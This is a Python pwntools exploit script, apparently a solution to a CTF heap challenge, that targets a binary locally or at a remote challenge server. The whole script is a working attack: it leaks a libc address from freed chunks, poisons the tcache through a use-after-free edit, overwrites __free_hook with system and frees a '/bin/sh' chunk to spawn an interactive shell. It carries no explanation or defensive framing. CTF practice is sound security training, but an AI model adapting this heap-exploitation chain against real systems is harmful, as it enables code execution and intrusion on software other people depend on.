from pwn import *
import time

context.log_level = 'debug'

debug = True

elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 30503)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP('./libc-2.31.so')
pop_rdi = rop.rdi.address


def add(idx, size):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def edit(idx, content):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Content: ", content)


def show(idx):
    io.sendlineafter(">", "4")
    io.sendlineafter("Index: ", str(idx))


for i in range(8):
    add(i, 0x80)

add(8, 0x20)

for i in range(8):
    delete(i)

show(7)
libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))
main_arena_offset = 0x1ecbe0
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_free_hook_address = libc.symbols["__free_hook"]
success("free_hook -> " + hex(_free_hook_address))

edit(6, p64(_free_hook_address - 8))
add(9, 0x80)
edit(9, "/bin/sh\0")
add(10, 0x80)
edit(10, p64(0) + p64(libc.symbols["system"]))
delete(9)

io.interactive()
